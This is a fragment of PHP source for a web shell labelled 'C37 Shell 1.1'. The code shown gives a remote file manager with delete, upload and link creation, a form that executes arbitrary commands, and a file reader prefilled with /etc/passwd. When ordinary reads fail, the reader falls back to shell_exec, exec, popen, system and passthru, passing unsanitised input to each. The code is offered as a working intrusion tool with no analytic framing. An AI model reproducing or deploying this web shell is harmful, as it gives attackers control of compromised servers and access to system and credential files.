GetPerms($dir[$dirFILE]); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A.'</font></a></td></tr>';		
				}
				else {
					/*display files*/
					++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE], '.') !== FALSE) { $eXT = strrchr($dir[$dirFILE], '.'); } echo '<tr onmouseover="this.style.backgroundColor=\'#8B0000\';" onmouseout="this.style.backgroundColor=\'\';"><td><table class="NoPad" style="margin-left:-2px;"><tr><td><img src="',$ImgSRC,$eXT,'" width="16" height="16" alt="" /></td><td><a href="?action=file&amp;dir=',$SCDIR,'&amp;file=',$File,'">',$dir[$dirFILE],'</a></td></tr></table></td><td>'; $B = sprintf('%u', filesize($dir[$dirFILE]));while ($B>=1024) { $B/=1024;++$S; }if ($S === 0) { echo $B,' Bytes'; } else {printf('%.3f %s',$B,$T[$S-1]); $S = 0; } echo '</td><td>',date('F d Y H:i:s.',filemtime($dir[$dirFILE])),'</td><td>'; $A = filegroup($dir[$dirFILE]); $B = fileowner($dir[$dirFILE]); echo $B; if (function_exists('posix_getpwuid')) { $PwUID = posix_getpwuid($B); echo ' (',$PwUID['name'],')'; } echo '/',$A; if (function_exists('posix_getgrgid')) { $PwGID = posix_getgrgid($A); if (is_array($PwGID)) { echo ' (',$PwGID['name'],')'; } } echo '</td><td><a href="?action=file&amp;act=chmod&amp;file=',$File,'&amp;dir=',$SCDIR,'"><font'; $A = GetPerms($dir[$dirFILE]); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A,'</font></a></td><td><a href="?action=download&amp;dir=',$SCDIR,'&amp;file=',$File,'"><img src="?action=img&amp;image=down" width="20" height="20" alt="Download" /></a> <input type="checkbox" name="F[',$i,']" value="',$dir[$dirFILE],'" /></td></tr>';
				}
			}
		}

		echo '</table></div>
		<br />
		<span style="font-size:12px;color:red;" title="Files\Sub-Directories in ',htmlspecialchars($CDIR),'">:: [Listing ',$F+1,' Files';
		if ($Z < -1) { if ($F < -1) { echo ', '; } echo $Z+1,'Links'; }
		if (($R > 2 && !isset($GLOB)) || ($R > 0 && isset($GLOB))) { echo ' and '; if (!isset($GLOB)) { echo $R-1; } else { echo $R+1; } echo ' sub-directories'; }
		echo ' in the current directory] ::</span><br />
			<div style="width:95%;text-align:left;">
				<select id="val" name="val">
					<option selected="selected">With Selected:</option>
					<option value="1">Delete Files</option>
					<option value="3">Zip into Archive</option>
				</select> 
				<input type="submit" value="&gt;&gt;" style="margin-right:15px;" /> 
				<a style="background-color:black;padding:4px;font-weight:600;cursor:default;" onclick="javascript:for (i=0;i&lt;document.getElementById(\'Form\').elements.length;i++) {document.getElementById(\'Form\').elements[i].checked=true; }">Check all</a> 
				<a style="background-color:black;padding:4px;font-weight:600;cursor:default;" onclick="javascript:for (i=0;i&lt;document.getElementById(\'Form\').elements.length;i++) {document.getElementById(\'Form\').elements[i].checked=false; }">Uncheck all</a>
			</div>
		</form>
		<br />
		<table style="text-align:center;">
			<tr>
				<td>
					<form action="?dir=',$SCDIR,'&amp;act=FileMake" method="post" style="display:inline;">Create a new file
						<br />
						<input type="text" id="fm" name="fm" size="40" /> 
						<input type="submit" value="Create" />
					</form>
				</td>
				<td>
					<form action="?action=CLI&amp;dir=',$SCDIR,'" method="post" style="display:inline;">Execute command
						<br />
						<input type="text" id="c" name="c" size="40" /> 
						<input type="submit" value="Exec" />
					</form>
				</td>
			</tr>
			<tr>
				<td>
					<form action="?dir=',$SCDIR,'&amp;act=DirMake" method="post" style="display:inline;">Create a new directory
						<br />
						<input type="text" id="dm" name="dm" size="40" /> 
						<input type="submit" value="Create" />
					</form>
				</td>
				<td>
					<form enctype="multipart/form-data" action="?dir=',$SCDIR,'&amp;act=Upload" method="post" style="display:inline;">Upload file
						<br />
						<input type="file" id="File" name="File" size="20" /> 
						<span style="cursor:pointer;color:red;" onclick="javascript:';
						if (ini_get('max_file_uploads') != '') { echo 'if (numoffields &lt;= ',ini_get('max_file_uploads'),') { '; }
						echo 'document.getElementById(next).innerHTML+=\'&lt;input type=\\\'file\\\' id=\\\'File\'+i+\'\\\' name=\\\'File\'+i+\'\\\' size=\\\'20\\\' /&gt;&lt;div id=\\\'ADD\'+i+\'\\\' style=\\\'text-align:left;display:none;\\\'&gt;&lt;/div&gt;\';';
						if (ini_get('max_file_uploads') != '') { echo 'numoffields++; }'; }
						echo 'document.getElementById(next).style.display=\'block\';next=\'ADD\'+i;i++;">[ADD]</span> 
						<input type="submit" value="Upload" />
						<div id="ADD" style="text-align:left;display:none;"></div>
					</form>
				</td>
			</tr>
			<tr>
				<td valign="top">
					<form action="?dir=',$SCDIR,'&amp;power=FileRead" method="post"><br />Try every function to read a file
						<br />
						<input type="text" id="value" name="value" size="40" value="/etc/passwd" /> 
						<input type="submit" value="Read" style="width:60px;" />
					</form>';
					if (isset($_GET['power']) && $_GET['power'] === 'FileRead') {
						echo '<br />';
						if (is_readable($_POST['value']) && sprintf('%u', filesize($_POST['value'])) > 0) {
							$File = '';

							$File = file_get_contents($_POST['value']);
							if ($File !== '') { $Suc = TRUE; }
							else {
								$Handle = fopen($_POST['value'], 'rb');
								$File = fread($Handle,sprintf('%u', filesize($_POST['value'])));
								if ($File !== '') { $Suc = TRUE; }
								else {
									while (!feof($Handle)) {
										$File = fgets($Handle, 4096);
									}
									if ($File !== '') { $Suc = TRUE; }
									else {
										fclose($Handle);
										$AAA = readfile($_POST['value']);
										if ($AAA !== FALSE) { $Suc = TRUE; }
										else {
											while (FALSE !== ($AAA = fgetc($Handle))) {
												$File .= $AAA;
											}
											if ($File !== '') { $Suc = TRUE; }
											else {
												fclose($Handle);
												if (!$IsWIN) {
													if (function_exists('system') || function_exists('passthru') || function_exists('shell_exec') || function_exists('exec') || function_exists('popen')) {
														if (function_exists('shell_exec')) { echo htmlspecialchars(shell_exec('cat '.$_POST['value'])); $Suc = TRUE; }
														elseif (function_exists('exec')) { $ExecArray = array(); exec('cat '.$_POST['value'],$ExecArray); foreach($ExecArray AS $Line) { echo htmlspecialchars($Line); } $Suc = TRUE; }
														elseif (function_exists('popen')) { $Read=''; $Handle = popen('cat '.$_POST['value'],'r'); while ($Read = fread($Handle,2096)) { echo htmlspecialchars($Read); } pclose($Handle); $Suc = TRUE; }
														elseif (function_exists('system') && system('cat '.$_POST['value'])) { $Suc = TRUE; }
														elseif (function_exists('passthru')) { passthru('cat '.$_POST['value']); $Suc = TRUE; }
													}
												}
												else {
													if (function_exists('system') || function_exists('passthru') || function_exists('shell_exec') || function_exists('exec') || function_exists('popen')) {
														if (function_exists('shell_exec')) { echo htmlspecialchars(shell_exec('type '.$_POST['value'])); $Suc = TRUE; }
														elseif (function_exists('exec')) { $ExecArray = array(); exec('type '.$_POST['value'],$ExecArray); foreach($ExecArray AS $Line) { echo htmlspecialchars($Line); } $Suc = TRUE; }
														elseif (function_exists('popen')) { $Read=''; $Handle = popen('type '.$_POST['value'],'r'); while ($Read = fread($Handle,2096)) { echo htmlspecialchars($Read); } pclose($Handle); $Suc = TRUE; }
														elseif (function_exists('system')) { system('type '.$_POST['value']); $Suc = TRUE; }
														elseif (function_exists('passthru')) { passthru('type '.$_POST['value']); $Suc = TRUE; }
													}
												}
											}
										}
									}
								}
							}
							if (isset($Suc)) { echo '<br /><textarea rows="5" cols="38" readonly="readonly">',htmlspecialchars($File),'</textarea>'; }
							else { echo '<br />Can\'t read file.'; }
						}
						else { echo 'File does not exist or is not readable or its size is 0'; }
					}
			echo '</td>
				<td valign="top">
					<form action="?dir=',$SCDIR,'&amp;act=Link" method="post">
						Create link<br />
						<table>
							<tr>
								<td>
									<input type="text" id="Name" name="Name" value="Link Name" onclick="javascript:if (this.value === \'Link Name\') this.value=\'\';" onblur="javascript: if(this.value === \'\') { this.value = \'Link name\'; }" style="width:140px;" /><br /><input type="text" id="To" name="To" value="Target of the link" onclick="javascript:if (this.value === \'Target of the link\') this.value=\'\';" onblur="javascript: if(this.value === \'\') { this.value = \'Target of the link\'; }" style="width:140px;" />
								</td>
								<td valign="middle">
									<select id="type" name="type">
										<option value="s">Symbolic Link</option>
										<option value="h">Hard Link</option>
									</select> 
									<input type="submit" value="Create" />
								</td>
							</tr>
						</table>
					</form>
				</td>
			</tr>
		</table>';
	}
}

function GetPerms(&$F) { /*From php.net*/ $perms = fileperms($F); if (($perms&0xC000)==0xC000) { $info='s'; } elseif (($perms&0xA000)==0xA000) { $info='l'; } elseif (($perms&0x8000)==0x8000) { $info='-'; } elseif (($perms&0x6000)==0x6000) { $info='b'; } elseif (($perms&0x4000)==0x4000) { $info='d'; } elseif (($perms&0x2000)==0x2000) { $info='c'; } elseif (($perms&0x1000)==0x1000) { $info='p'; } else { $info='u'; } $info.=(($perms&0x0100) ? 'r':'-'); $info.=(($perms&0x0080) ? 'w':'-'); $info.=(($perms&0x0040) ?(($perms&0x0800) ? 's':'x'):(($perms&0x0800) ? 'S':'-')); $info.=(($perms&0x0020) ? 'r':'-'); $info.=(($perms&0x0010) ? 'w':'-'); $info.=(($perms&0x0008) ?(($perms&0x0400) ? 's':'x' ):(($perms&0x0400) ? 'S':'-')); $info.=(($perms&0x0004) ? 'r':'-'); $info.=(($perms&0x0002) ? 'w':'-'); $info.=(($perms&0x0001) ?(($perms&0x0200) ? 't':'x'):(($perms&0x0200) ? 'T':'-'));return $info; }
function GetLastError() {
	if (function_exists('error_get_last')) {
		$A = error_get_last();
		if ($A!==NULL) { echo '<br />(error_get_last: [Type]: ',$A['type'],' | [Message]: ',$A['message'],')'; } 
		return;
	}
	else { return; }
}

echo '<br /><br />
<div style="border: 1px solid #303030;padding:3px; margin-left:-9px; margin-right:-8px;">
	-[<font color="red">C37 Shell</font> 1.1]
	| [<a href="http://www.stayinvisible.com/" target="_blank">
		<font color="red">Remote IP: </font>',$_SERVER['REMOTE_ADDR'];
		if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { echo ' <font color="red"> Forwarded For:</font> ',$_SERVER['HTTP_X_FORWARDED_FOR']; }
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) { echo ' <font color="red"> Client IP:</font> ',$_SERVER['HTTP_CLIENT_IP']; }
		if (!empty($_SERVER['HTTP_PROXY_USER'])) { echo ' <font color="red"> Proxy user:</font> ',$_SERVER['HTTP_PROXY_USER']; }
	echo '</a> | 
	CODED BY <span style="color:white;font-weight:bold;">REACTiON</span>]-
</div>
</center>
<script type="text/javascript">var i=2;var numoffields=0;var next=\'ADD\';</script>
</body>
</html>
<textarea style="display:none;opacity:0;" rows="0" cols="0">';
?>